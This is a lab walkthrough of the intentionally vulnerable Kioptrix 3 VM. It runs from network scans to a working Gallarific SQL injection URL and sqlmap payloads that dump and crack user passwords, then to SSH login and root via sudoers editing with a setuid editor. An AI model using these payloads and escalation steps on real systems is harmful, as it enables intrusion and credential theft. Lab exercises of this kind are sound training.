# level 3

| Proto | port    | Service/URL                         | Info                                                                  | Potential Vulns | Verified Vulns |
|-------|---------|-------------------------------------|-----------------------------------------------------------------------|-----------------|----------------|
|       |         | system                              | Ubuntu 8.04.3 LTS Linux kernel 2.6.24-24 <br> dreg:Mast3r <br> loneferret:starwars | [vmsplice' Local Privilege Escalation (1) ](https://www.exploit-db.com/exploits/5093) <br> [SCTP FWD Memory Corruption Remote Overflow ](https://www.exploit-db.com/exploits/8556)
| TCP   | 22      | SSH                                 | OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)                        |                 |                | 
| TCP   | 80      | HTTP                                | Apache/2.2.8 (Ubuntu) (EOL) <br> PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch (outdated) <br> HTTP TRACE method is active | |      | 
| TCP   | 80      | http://kioptrix3.com/phpmyadmin/    | phpMyAdmin 2.11.3deb1ubuntu1.3 <br> 2.11.3.0 (2007-12-08) (outdated)  | [phpMyAdmin 2.x - 'Export.php' File Disclosure](https://www.exploit-db.com/exploits/23640) <br> [phpMyAdmin 2.x - Information Disclosure](https://www.exploit-db.com/exploits/22798)               |                |
| TCP   | 80      | http://kioptrix3.com/               | LotusCMS <br> [Only security updates have been provided as of June 2012.](https://github.com/kevinbluett/LotusCMS-Content-Management-System) | [Lotus CMS Fraise 3.0 - Local File Inclusion / Remote Code Execution](https://www.exploit-db.com/exploits/15964) <br> [LotusCMS 3.0 - 'eval()' Remote Command Execution (Metasploit)](https://www.exploit-db.com/exploits/18565) | 'eval()' | 
| TCP   | 80      | http://kioptrix3.com/gallery/       | Gallarific 2.1 - Free Version released October 10, 2009 <br> admin:n0t7t1k4 | [Gallarific - 'user.php' Arbirary Change Admin Information](https://www.exploit-db.com/exploits/8796) <br> [GALLARIFIC PHP Photo Gallery Script - 'gallery.php' SQL Injection](https://www.exploit-db.com/exploits/15891) | 'gallery.php' SQL Injection <br> http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users-- |


## Enum

### Where you at

```txt
nmap -n -sn -PR 192.168.88.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-03 12:07 CET
Nmap scan report for 192.168.88.2
Host is up (0.00019s latency).
MAC Address: 00:50:56:FE:4E:C1 (VMware)
Nmap scan report for 192.168.88.131
Host is up (0.00090s latency).
MAC Address: 00:0C:29:FF:C3:CB (VMware)
Nmap scan report for 192.168.88.254
Host is up (0.00033s latency).
MAC Address: 00:50:56:F7:8F:D0 (VMware)
Nmap scan report for 192.168.88.128
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.13 seconds
```

### TCP

```txt
# Nmap 7.80 scan initiated Fri Jan  3 12:11:21 2020 as: nmap -p- -A -oA tcp 192.168.88.131
Nmap scan report for 192.168.88.131
Host is up (0.00058s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 30:e3:f6:dc:2e:22:5d:17:ac:46:02:39:ad:71:cb:49 (DSA)
|_  2048 9a:82:e6:96:e4:7e:d6:a6:d7:45:44:cb:19:aa:ec:dd (RSA)
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Ligoat Security - Got Goat? Security ...
MAC Address: 00:0C:29:FF:C3:CB (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.58 ms 192.168.88.131

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan  3 12:11:32 2020 -- 1 IP address (1 host up) scanned in 12.53 seconds
```

### UDP

```
map -sU -T4 192.168.88.131 -oA udp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 14:08 CET
Nmap scan report for kioptrix3.com (192.168.88.131)
Host is up (0.00063s latency).
All 1000 scanned ports on kioptrix3.com (192.168.88.131) are closed (955) or open|filtered (45)
MAC Address: 00:0C:29:FF:C3:CB (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1039.80 seconds
```

### 192.168.88.131 - 80

#### Nikto

```
nikto -h kioptrix3.com
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.88.131
+ Target Hostname:    kioptrix3.com
+ Target Port:        80
+ Start Time:         2020-01-04 14:09:31 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
+ Cookie PHPSESSID created without the httponly flag
+ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.6
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /favicon.ico, inode: 631780, size: 23126, mtime: Fri Jun  5 21:22:00 2009
+ PHP/5.2.4-2ubuntu5.6 appears to be outdated (current is at least 7.2.12). PHP 5.6.33, 7.0.27, 7.1.13, 7.2.1 may also current release for each branch.
+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3092: /phpmyadmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /icons/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7784 requests: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2020-01-04 14:09:52 (GMT1) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### gobuster

```
~/go/bin/gobuster dir -u http://kioptrix3.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -e -o gobuster_dir_dir-list-med_kioptrix3.com

==============================================================                             
Gobuster v3.0.1                                                                             
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                             
===============================================================                             
[+] Url:            http://kioptrix3.com                                                    
[+] Threads:        40                                                                      
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt            
[+] Status codes:   200,204,301,302,307,401,403                                             
[+] User Agent:     gobuster/3.0.1                                                          
[+] Expanded:       true                                                                    
[+] Timeout:        10s                                                                     
===============================================================                             
2020/01/04 14:27:57 Starting gobuster                                                       
===============================================================                             
http://kioptrix3.com/modules (Status: 301)                                                  
http://kioptrix3.com/gallery (Status: 301)                                                  
http://kioptrix3.com/data (Status: 403)                                                     
http://kioptrix3.com/core (Status: 301)                                                     
http://kioptrix3.com/style (Status: 301)                                                    
http://kioptrix3.com/cache (Status: 301)                                                    
http://kioptrix3.com/phpmyadmin (Status: 301)                                               
http://kioptrix3.com/server-status (Status: 403)                                            
===============================================================                             
2020/01/04 14:28:12 Finished                                                                
===============================================================  
```


## exploit

### phpMyAdmin

Default creds
user: admin
pass: 

### Gallarific 2.1 SQLi

```
http://kioptrix3.com/gallery/gallery.php?id=null+and+1=2+union+select+1,group_concat(userid,0x3a,username,0x3a,password),3,4,5,6+from+gallarific_users--

1:admin:n0t7t1k4
3
```

#### sqlmap

```
sqlmap identified the following injection point(s) with a total of 150 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: id=-6226 OR 6767=6767

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: id=1 OR ROW(7964,8851)>(SELECT COUNT(*),CONCAT(0x71787a6b71,(SELECT (ELT(7964=7964,1))),0x7171767a71,FLOOR(RAND(0)*2))x FROM (SELECT 7501 UNION SELECT 4753 UNION SELECT 8655 UNION SELECT 9044)a GROUP BY x)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 1628 FROM (SELECT(SLEEP(5)))jacP)

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=1 UNION ALL SELECT CONCAT(0x71787a6b71,0x67416378756a444d6e4a6868477742664b48597175664f664d4f7a69755a7963735579686c6f5359,0x7171767a71),NULL,NULL,NULL,NULL,NULL-- MpZe
---
back-end DBMS: MySQL >= 4.1
Database: gallery
Table: dev_accounts
[2 entries]
+----+---------------------------------------------+------------+
| id | password                                    | username   |
+----+---------------------------------------------+------------+
| 1  | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   | dreg       |
| 2  | 5badcaf789d3d1d09794d8f021f40f0e (starwars) | loneferret |
+----+---------------------------------------------+------------+

Database: gallery
Table: gallarific_users
[1 entry]
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| userid | email   | photo   | website | joincode | lastname | password | username | usertype  | firstname | datejoined | issuperuser |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+
| 1      | <blank> | <blank> | <blank> | <blank>  | User     | n0t7t1k4 | admin    | superuser | Super     | 1302628616 | 1           |
+--------+---------+---------+---------+----------+----------+----------+----------+-----------+-----------+------------+-------------+

Database: gallery
Table: gallarific_settings
[18 entries]
+-------------+--------------------------------------+----------------+
| settings_id | settings_name                        | settings_value |
+-------------+--------------------------------------+----------------+
| 1           | gallarific_version                   | 2.0            |
| 2           | gallarific_theme                     | black          |
| 3           | gallarific_gallery_name              | Gallarific     |
| 7           | gallarific_photos_per_page           | 20             |
| 8           | gallarific_comments_per_page         | 10             |
| 9           | gallarific_users_per_page            | 20             |
| 10          | gallarific_recent_photos             | 4              |
| 11          | gallarific_popular_photos            | 8              |
| 12          | gallarific_accept_user_registrations | 1              |
| 15          | gallarific_comments_enabled          | 1              |
| 16          | gallarific_auto_approve_comments     | 0              |
| 17          | gallarific_userimage_width           | 32             |
| 18          | gallarific_userimage_height          | 32             |
| 19          | gallarific_medium_width              | 430            |
| 20          | gallarific_medium_height             | 430            |
| 21          | gallarific_thumbnail_width           | 150            |
| 22          | gallarific_thumbnail_height          | 150            |
| 24          | gallarific_installer_done            | 1              |
+-------------+--------------------------------------+----------------+

Database: gallery
Table: gallarific_photos
[3 entries]
+--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+
| userid | photoid | galleryid | tags    | title                 | views | size   | status | filename       | votecount | votetotal | description                      | dateuploaded |
+--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+
| 1      | 5       | 1         | <blank> | Photo Shoot           | 19    | 19374  | 1      | 8y1a02r6yh.jpg | 0         | 0         | New picture for new book         | 1302652908   |
| 1      | 3       | 1         | <blank> | In the know...        | 16    | 16279  | 1      | 8csqlvc375.jpg | 0         | 0         | Self-Explanotory                 | 1302652708   |
| 1      | 4       | 1         | <blank> | Getting ready for GNN | 15    | 10618  | 1      | 0q52na4t2g.jpg | 1         | 5         | Hours before software's release! | 1302651920   |
+--------+---------+-----------+---------+-----------------------+-------+--------+--------+----------------+-----------+-----------+----------------------------------+--------------+

Database: gallery
Table: gallarific_galleries
[1 entry]
+----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+
| parentid | galleryid | name              | sort | created    | description                                                                                                             |
+----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+
| 0        | 1         | Ligoat Press Room | 0    | 1302628616 | See how we are doing in the news!  This is a collection of wild pictures, good times and how to make money at its best. |
+----------+-----------+-------------------+------+------------+-------------------------------------------------------------------------------------------------------------------------+

Database: gallery
Table: gallarific_stats
[15 entries]
+----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+
| ID | Var01            | Var02 | Var03                                                                                                                                                                                                | Var04 | Var05 | Var06   | Var07        | Var08   | Var09                | Var10    | Var11                    | Var12                    | Var13                            | Var14                                            | Var15                            | Var16                                                | Var17   | Var18   | Var19                        | Var20                                        | Var21   | Var22   | Var23   |
+----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+
| 1  | MTMwMjYyODcxOQ== | MTU=  | aHR0cDovL2tpb3B0cml4My5jb20vaW5kZXgucGhw                                                                                                                                                             | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | V2l0aCBUaGFua3MgVG8gfg== | U2l0ZSBMaW5rcyB+         | UGhvdG8gR2FsbGVyeSBTY3JpcHQ=     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS90b3VyLnBocA== | SG9zdCBNdWx0aXBsZSBTaXRlcw==     | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 2  | MTMwMjYyODgwNg== | MTU=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9bnVsbCthbmQrMT0yK3VuaW9uK3NlbGVjdCsxLGdyb3VwX2NvbmNhdCh1c2VyaWQsMHgzYSx1c2VybmFtZSwweDNhLHBhc3N3b3JkKSwzLDQsNSw2Kytmcm9tK2dhbGxhcmlmaWNfdXNlcnMtLQ== | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | SG9zdCBSZXNlbGxlciBTaXRlcw==     | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 3  | MTMwMjYyODg0OA== | MTQ=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MQ==                                                                                                                                                 | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | VGhhbmtzIFRv             | V2ViIExpbmtz             | UEhQIFBpY3R1cmUgR2FsbGVyeQ==     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | RmFzdCBTZXJ2ZXIgSG9zdA==         | aHR0cDovL3d3dy5zYWNob3N0LmNvbS8=                     | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 4  | MTMwMjYyODg3Mw== | MTU=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9NDg=                                                                                                                                                 | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | UGhvdG8gR2FsbGVyeSBTY3JpcHRz     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | TXVsdGlwbGUgRG9tYWluIEhvc3Rpbmc= | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 5  | MTMwMjYyODg4MA== | MjQ=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9NTIyOA==                                                                                                                                             | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | R2FsbGVyeSBQaG90byBQSFAgU2NyaXB0 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | QnV5IFNTTCBDZXJ0aWZpY2F0ZQ==     | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw==         | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 6  | MTMwMjYyODg4OQ== | MjU=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMDk0MjA9MTQ4MQ==                                                                                                                         | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29uZmVycmVkIEJ5IH4=     | TW9yZSBTaXRlcyB+         | UGl4IEdhbGxlcnk=                 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS9mYXEucGhw     | R2VvVHJ1c3QgU1NMIENlcnRpZmljYXRl | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw==         | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 7  | MTMwMjYyODg5Nw== | MjQ=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMDEyOTY9MTI5Ng==                                                                                                                         | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | QXNzb2NpYXRlZCBXaXRoIC0= | T3RoZXIgTGlua3MgLQ==     | UEhQIFBob3RvcyBTY3JpcHQ=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | RmFudGFzdGljbyBIb3N0             | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 8  | MTMwMjYyODkwNw== | MTM=  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSUyMEFORCUyMFNMRUVQJTI4NSUyOQ==                                                                                                                     | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJvdmlkZWQgYnkgLS0=     | T3RoZXIgTGlua3MgLS0=     | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | RmFudGFzdGljbyBIb3N0             | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 9  | MTMwMjYzMTM3MA== | MTc=  | aHR0cDovL2tpb3B0cml4My5jb20vcC5waHAvMQ==                                                                                                                                                             | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29uZmVycmVkIEJ5IH4=     | TW9yZSBTaXRlcyB+         | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | UmVzZWxsZXIgQWNjb3VudCBIb3N0     | aHR0cDovL3d3dy5teWN3cy5jb20vaG9zdGluZy9yZXNlbGxlci8= | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 10 | MTMwMjYzNTQ5Nw== | MjU=  | aHR0cDovL2tpb3B0cml4My5jb20vZy5waHAvMQ==                                                                                                                                                             | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | SW1wbGVtZW50ZWQgQnk6     | R3JhY2lvdXMgVGhhbmtzOg== | R2FsbGFyaWZpYw==                 | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | RmFzdGVyIFdlYiBIb3N0             | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 11 | MTMwMjYzNTUxMA== | MTA=  | aHR0cDovL2tpb3B0cml4My5jb20vcmVjZW50LnBocA==                                                                                                                                                         | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | TWFkZSBQb3NzaWJsZSBCeTo= | VGhhbmtzIFRvOg==         | UGhvdG8gR2FsbGVyeSBTY3JpcHQ=     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS90b3VyLnBocA== | Q2hlYXBlc3QgRG9tYWluIE5hbWVz     | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vY3AvY2hlY2sucGhw | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 12 | MTMwMjYzNTU5MQ== | MjM=  | aHR0cDovL2tpb3B0cml4My5jb20vbG9nb3V0LnBocA==                                                                                                                                                         | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJlc2VudGVkIEJ5IDo6     | TXVjaCBUaGFua3MgOjo=     | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | UmVzZWxsZXIgQWNjb3VudCBIb3N0     | aHR0cDovL3d3dy5teWN3cy5jb20vaG9zdGluZy9yZXNlbGxlci8= | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 13 | MTMwMjYzODQwOA== | MjE=  | aHR0cDovL2tpb3B0cml4My5jb20vcHJvZmlsZS5waHA=                                                                                                                                                         | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | UHJvdmlkZWQgYnkgLS0=     | T3RoZXIgTGlua3MgLS0=     | UGhvdG8gU2hhcmluZyBHYWxsZXJ5     | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | SG9zdCBNdWx0aXBsZSBEb21haW5z     | aHR0cDovL3d3dy5kZWFkc2VyaW91cy5uZXQv                 | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
| 14 | MTMwMjY1MTc5Mg== | MjY=  | aHR0cDovL2tpb3B0cml4My5jb20vcC5waHAvMg==                                                                                                                                                             | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | VGhhbmtzIHRvID4=         | QWxzbyA+                 | UEhQIFBob3RvIEdhbGxlcnk=         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS8=             | U2FjcmFtZW50byBIb3N0aW5n         | aHR0cDovL3d3dy5zYWNob3N0LmNvbS8=                     | <blank> | <blank> | Q2hlYXAgU1NMIENlcnRpZmljYXRl | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw== | <blank> | <blank> | <blank> |
| 15 | MTMwMjY1MjA4NQ== | Nw==  | aHR0cDovL2tpb3B0cml4My5jb20vZ2FsbGVyeS5waHA/aWQ9MSZzb3J0PXBob3RvaWQ=                                                                                                                                 | AA==  | MA==  | <blank> | I2JjYmNiYw== | <blank> | VGFob21hLCBWZXJkYW5h | MTFweDs= | Q29tcGxpbWVudHMgT2Y6     | QWRkaXRpb25hbCBUaGFua3M6 | UEhQIFBob3RvIFNvZnR3YXJl         | aHR0cDovL3d3dy5nYWxsYXJpZmljLmNvbS92aWRlby5waHA= | QnV5IFNTTCBDZXJ0aWZpY2F0ZQ==     | aHR0cDovL3d3dy5icmlnaHQtYnl0ZS5jb20vc3NsLw==         | <blank> | <blank> | <blank>                      | <blank>                                      | <blank> | <blank> | <blank> |
+----+------------------+-------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+-------+---------+--------------+---------+----------------------+----------+--------------------------+--------------------------+----------------------------------+--------------------------------------------------+----------------------------------+------------------------------------------------------+---------+---------+------------------------------+----------------------------------------------+---------+---------+---------+

Database: gallery
Table: gallarific_comments
[0 entries]
+---------+
| comment |
+---------+
+---------+
```

#### SSH
```
ssh loneferret@192.168.88.131
The authenticity of host '192.168.88.131 (192.168.88.131)' can't be established.
RSA key fingerprint is SHA256:NdsBnvaQieyTUKFzPjRpTVK6jDGM/xWwUi46IR/h1jU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.88.131' (RSA) to the list of known hosts.
loneferret@192.168.88.131's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO

loneferret@Kioptrix3:~$ whereis ht
ht: /usr/local/bin/ht
loneferret@Kioptrix3:~$ ls -la /usr/local/bin/ht
-rwsr-sr-x 1 root root 2072344 2011-04-16 07:26 /usr/local/bin/ht ### setuid bit is enabled, owned by root


Edited /etc/sudoers
    # User privilege specification
    root    ALL=(ALL) ALL
    loneferret ALL=(ALL) ALL

loneferret@Kioptrix3:~$ sudo bash
[sudo] password for loneferret: 
root@Kioptrix3:~#

```

### LotusCMS 3.0 - 'eval()'

```
msf5 > workspace kioptrix                                                                                                                                                                                                                                                                                                                                                                                       
[*] Workspace: kioptrix                                                                                                                                                                                                                                                                                                                                                                                         
msf5 > search lotus                                                                                                                                                                                                                                                                                                                                                                                             
                                                                                                                                                                                                                                                                                                                                                                                                                
Matching Modules                                                                                                                                                                                                                                                                                                                                                                                                
================

   #   Name                                                     Disclosure Date  Rank       Check  Description
   -   ----                                                     ---------------  ----       -----  -----------
   0   auxiliary/dos/http/ibm_lotus_notes                       2017-08-31       normal     No     IBM Notes encodeURI DOS
   1   auxiliary/dos/http/ibm_lotus_notes2                      2017-08-31       normal     No     IBM Notes Denial Of Service
   2   auxiliary/dos/misc/ibm_sametime_webplayer_dos            2013-11-07       normal     No     IBM Lotus Sametime WebPlayer DoS
   3   auxiliary/gather/ibm_sametime_enumerate_users            2013-12-27       normal     No     IBM Lotus Notes Sametime User Enumeration
   4   auxiliary/gather/ibm_sametime_room_brute                 2013-12-27       normal     No     IBM Lotus Notes Sametime Room Name Bruteforce
   5   auxiliary/gather/ibm_sametime_version                    2013-12-27       normal     No     IBM Lotus Sametime Version Enumeration
   6   auxiliary/scanner/lotus/lotus_domino_hashes                               normal     No     Lotus Domino Password Hash Collector
   7   auxiliary/scanner/lotus/lotus_domino_login                                normal     No     Lotus Domino Brute Force Utility
   8   auxiliary/scanner/lotus/lotus_domino_version                              normal     No     Lotus Domino Version
   9   exploit/multi/http/lcms_php_exec                         2011-03-03       excellent  Yes    LotusCMS 3.0 eval() Remote Command Execution
   10  exploit/windows/browser/ibmlotusdomino_dwa_uploadmodule  2007-12-20       normal     No     IBM Lotus Domino Web Access Upload Module Buffer Overflow
   11  exploit/windows/browser/inotes_dwa85w_bof                2012-06-01       normal     No     IBM Lotus iNotes dwa85W ActiveX Buffer Overflow
   12  exploit/windows/browser/notes_handler_cmdinject          2012-06-18       excellent  No     IBM Lotus Notes Client URL Handler Command Injection
   13  exploit/windows/browser/quickr_qp2_bof                   2012-05-23       normal     No     IBM Lotus QuickR qp2 ActiveX Buffer Overflow
   14  exploit/windows/fileformat/lotusnotes_lzh                2011-05-24       good       No     Lotus Notes 8.0.x - 8.5.2 FP2 - Autonomy Keyview (.lzh Attachment)
   15  exploit/windows/lotus/domino_http_accept_language        2008-05-20       average    No     IBM Lotus Domino Web Server Accept-Language Stack Buffer Overflow
   16  exploit/windows/lotus/domino_icalendar_organizer         2010-09-14       normal     Yes    IBM Lotus Domino iCalendar MAILTO Buffer Overflow
   17  exploit/windows/lotus/domino_sametime_stmux              2008-05-21       average    Yes    IBM Lotus Domino Sametime STMux.exe Stack Buffer Overflow
